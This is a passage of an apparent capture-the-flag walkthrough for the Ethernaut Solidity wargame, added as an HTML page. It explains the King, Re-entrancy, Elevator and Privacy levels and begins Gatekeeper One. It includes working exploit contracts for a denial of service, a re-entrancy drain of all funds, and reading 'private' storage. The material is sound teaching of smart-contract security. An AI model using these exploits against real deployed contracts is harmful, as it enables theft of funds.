+  Demystifying Solution:
+  <a href="#demystifying-solution-8" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Due to the wrong implementation of the King contract due to the contract requirement of transfer to the overthrown king before claiming the new king we can revert when the King contract transfer the value to our contract.</p>
+<p>The Exploit() method transfer the value to the King contract and therefore the address claim the kingship:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Exploit</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">payable</span> <span style="color:#a6e22e">instanceAddress</span>) <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">success</span>, ) <span style="color:#f92672">=</span> <span style="color:#a6e22e">instanceAddress</span>.<span style="color:#a6e22e">call</span>{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>}(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">success</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The receive() fallback method reverts when the contract tries to transfer the value back and therefore never getting overthorwn:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">receive</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-10-re-entrancy">
+  LEVEL 10: Re-entrancy
+  <a href="#level-10-re-entrancy" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-9">
+  Objective:
+  <a href="#objective-9" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Steal all the funds from the contract.</li>
+</ul>
+<h3 id="demystifying-contract-8">
+  Demystifying Contract:
+  <a href="#demystifying-contract-8" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is constructed based on different functions, The first two lines are defining a library and a map:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">using</span> <span style="color:#a6e22e">SafeMath</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">uint256</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mapping</span>(<span style="color:#a6e22e">address</span> =&gt; <span style="color:#a6e22e">uint</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">balances</span>;
+</span></span></code></pre></div><p>The first line uses SafeMath library and the second line is a map defined as &ldquo;balances&rdquo; that assigns every address to it&rsquo;s balance.</p>
+<p>The donate() method allows address&rsquo;s to transfer value to each other:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">donate</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_to</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">_to</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">_to</span>].<span style="color:#a6e22e">add</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The balanceOf() method allows address&rsquo;s to check any balance:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">_who</span>) <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">view</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">balance</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">_who</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The withdraw() method allows address to withdraw their balance:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_amount</span>) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">_amount</span>) {
+</span></span><span style="display:flex;"><span>        (<span style="color:#a6e22e">bool</span> <span style="color:#a6e22e">result</span>,) <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>.<span style="color:#a6e22e">call</span>{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span><span style="color:#a6e22e">_amount</span>}(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">result</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">_amount</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">balances</span>[<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>] <span style="color:#f92672">-=</span> <span style="color:#a6e22e">_amount</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>With the requirement of the address balance bigger or equal to the _amount parameter, and then subtracting the amount from the balance.</p>
+<p>The receive() method is a fallback method that allows to transfer value into the contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">receive</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {}
+</span></span></code></pre></div><h3 id="demystifying-solution-9">
+  Demystifying Solution:
+  <a href="#demystifying-solution-9" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Due to SafeMath library we can&rsquo;t underflow nor overflow the balance.</p>
+<p>However due to the withdraw() method transfering the value to the address before subtracting the value from the balance and the lack of the ReentrancyGuard function modifiers we can call the withdraw() method again after it invokes our contract before it subtracts the value form the balance.</p>
+<p>The solution contract sets an interface for the Reentrance&rsquo;s contract donate() and withdraw() methods:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IReentrance</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">donate</span>(<span style="color:#a6e22e">address</span>) <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>(<span style="color:#a6e22e">uint256</span>) <span style="color:#a6e22e">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The solution contract is constructed based on a function and a constructor, The first two lines are defining two variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">IReentrance</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">instance</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">deposit</span>;
+</span></span></code></pre></div><p>The first line is the instance for the Reentrance contract interface, The second line is the initial deposit variable.</p>
+<p>The constructor initialize the instance address for the Reentrance contract interface:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">instanceAddress</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">IReentrance</span>(<span style="color:#a6e22e">instanceAddress</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The Exploit() method calls the donate() method and immediately calls the withdraw() method with the deposit requirement bigger than or equal to 0.001 ether:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Exploit</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span> <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0.001</span> <span style="color:#a6e22e">ether</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">deposit</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">value</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">donate</span>{<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">deposit</span>}(<span style="color:#a6e22e">address</span>(<span style="color:#66d9ef">this</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">withdraw</span>(<span style="color:#a6e22e">deposit</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The withdraw() method called in Exploit() method invokes the receive() fallback function that calls the the withdraw() method again and again until the Reentrance contract balance is 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">receive</span>() <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">payable</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">balance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">address</span>(<span style="color:#a6e22e">instance</span>).<span style="color:#a6e22e">balance</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uint256</span> <span style="color:#a6e22e">toWithdraw</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">balance</span> <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">deposit</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">balance</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">deposit</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">toWithdraw</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">withdraw</span>(<span style="color:#a6e22e">toWithdraw</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The fallback() function calls the withdraw() method repeatedly before it subtracts the value from the balance and therefore withdrawing more than the address balance.</p>
+<p>We can check the contract balance equal to 0 by calling:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">getBalance</span>(<span style="color:#a6e22e">instance</span>)
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-11-elevator">
+  LEVEL 11: Elevator
+  <a href="#level-11-elevator" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-10">
+  Objective:
+  <a href="#objective-10" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Reach the top of your building (Set the top variable to true).</li>
+</ul>
+<h3 id="demystifying-contract-9">
+  Demystifying Contract:
+  <a href="#demystifying-contract-9" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is constructed based on a function and an interface.</p>
+<p>The contract sets an interface for the Building contract isLastFloor() method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Building</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isLastFloor</span>(<span style="color:#a6e22e">uint</span>) <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The first line is the boolean top state variable, The second line is the floor variable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">bool</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">top</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">floor</span>;
+</span></span></code></pre></div><p>The goTo() method validates the if statement only if the building instance isLastFloor() method returns false so that it can be inverted to true and therefore sets the top to false:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">goTo</span>(<span style="color:#a6e22e">uint</span> <span style="color:#a6e22e">_floor</span>) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Building</span> <span style="color:#a6e22e">building</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Building</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> <span style="color:#a6e22e">building</span>.<span style="color:#a6e22e">isLastFloor</span>(<span style="color:#a6e22e">_floor</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">floor</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_floor</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">top</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">building</span>.<span style="color:#a6e22e">isLastFloor</span>(<span style="color:#a6e22e">floor</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="demystifying-solution-10">
+  Demystifying Solution:
+  <a href="#demystifying-solution-10" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The goTo() method sets the boolean top state variable to true if the building instance isLastFloor() method returns false the first time so it validates the if statement and true the others so it sets the top state variable to true.</p>
+<p>The solution contract sets an interface for the Elevator contract goTo() method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IElevator</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">goTo</span>(<span style="color:#a6e22e">uint</span>) <span style="color:#a6e22e">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The solution contract is constructed based on different functions and a constructor, The first two lines are defining two variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">IElevator</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">instance</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint</span> <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">inc</span>;
+</span></span></code></pre></div><p>The first line is the instance for the Elevator contract interface, The second line is the inc variable used to determine the isLastFloor() method state.</p>
+<p>The constructor initialize the instance address for the Elevator contract interface:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">address</span> <span style="color:#a6e22e">instanceAddress</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">IElevator</span>(<span style="color:#a6e22e">instanceAddress</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The Exploit() method calls the goTo() instance method:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Exploit</span>() <span style="color:#a6e22e">external</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">goTo</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The goTo() instance method called in Exploit() method invokes the solution contract isLastFloor() function that returns false to validate the Elevator contract if statement and then only returns true and therefore sets the boolean top state variable to true:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isLastFloor</span>(<span style="color:#a6e22e">uint</span>) <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">returns</span> (<span style="color:#a6e22e">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">inc</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">inc</span><span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>You can check the boolean top state variable equal to true by:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">top</span>();
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-12-privacy">
+  LEVEL 12: Privacy
+  <a href="#level-12-privacy" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-11">
+  Objective:
+  <a href="#objective-11" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Unlock the contract.</li>
+</ul>
+<h3 id="demystifying-contract-10">
+  Demystifying Contract:
+  <a href="#demystifying-contract-10" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is constructed based on a constructor and a function, The first six lines are defining six variables:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">bool</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">locked</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint256</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">ID</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">timestamp</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint8</span> <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">flattening</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint8</span> <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">denomination</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">uint16</span> <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">awkwardness</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">uint16</span>(<span style="color:#a6e22e">block</span>.<span style="color:#a6e22e">timestamp</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">bytes32</span>[<span style="color:#ae81ff">3</span>] <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">data</span>;
+</span></span></code></pre></div><p>The first line is the boolean locked state variable, The second line is the block timestamp variable defined as ID, The third line is the private flattening variable initiated as 10, The fourth line is the private denomination variable initiated as 255, The fifth line is the private awkwardness variable initiated as the unsigned integer of the block timestamp and the last line is the data private variable.</p>
+<p>The constructor initialize the data variable to the constructor parameter _data variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">constructor</span>(<span style="color:#a6e22e">bytes32</span>[<span style="color:#ae81ff">3</span>] <span style="color:#a6e22e">memory</span> <span style="color:#a6e22e">_data</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_data</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The unlock() method sets the locked variable to false and unlocks the contract if the function parameter _key variable is equal to the data[2] variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">unlock</span>(<span style="color:#a6e22e">bytes16</span> <span style="color:#a6e22e">_key</span>) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">_key</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">bytes16</span>(<span style="color:#a6e22e">data</span>[<span style="color:#ae81ff">2</span>]));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">locked</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="demystifying-solution-11">
+  Demystifying Solution:
+  <a href="#demystifying-solution-11" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>We previously stated that the private state variable means that other contracts can&rsquo;t read the variable, However the variable is publicly availabe in the blockchain as the contract slot.</p>
+<p>Due to the contract storage occupation we can count that the data[2] variable is stored at slot 5.</p>
+<p>We can check the contract slot 5 storage by:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">web3</span>.<span style="color:#a6e22e">eth</span>.<span style="color:#a6e22e">getStorageAt</span>(<span style="color:#a6e22e">instance</span>, <span style="color:#ae81ff">5</span>)
+</span></span></code></pre></div><p>We can slice the data to cast the hex prefix by:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">slice</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">34</span>)
+</span></span></code></pre></div><p>And we can unlock the contract by:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">unlock</span>(<span style="color:#a6e22e">key</span>)
+</span></span></code></pre></div><p>You can check the contract locked equal to false:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">locked</span>()
+</span></span></code></pre></div><p>And now you can submit your instance!</p>
+<h2 id="level-13-gatekeeper-one">
+  LEVEL 13: Gatekeeper One
+  <a href="#level-13-gatekeeper-one" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<h3 id="objective-12">
+  Objective:
+  <a href="#objective-12" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>Make it past the gatekeepers and register as an entrant.</li>
+</ul>
+<h3 id="demystifying-contract-11">
+  Demystifying Contract:
+  <a href="#demystifying-contract-11" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The contract is constructed based on a function and different modifiers, The first line defines the entrant address variable:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">address</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">entrant</span>;
+</span></span></code></pre></div><p>The gateOne modifier serves the purpose of making sure that the wallet address isn&rsquo;t equal to the caller address or the caller is only a contract:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateOne</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">msg</span>.<span style="color:#a6e22e">sender</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">tx</span>.<span style="color:#a6e22e">origin</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The gateTwo modifier serves the purpose of making sure that the gas left is a multiple of 8191 or the gas left modulo 8191 is equal to 0:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">modifier</span> <span style="color:#a6e22e">gateTwo</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">require</span>(<span style="color:#a6e22e">gasleft</span>() <span style="color:#f92672">%</span> <span style="color:#ae81ff">8191</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">_</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The gateThree modifier define three different requirements:</p>
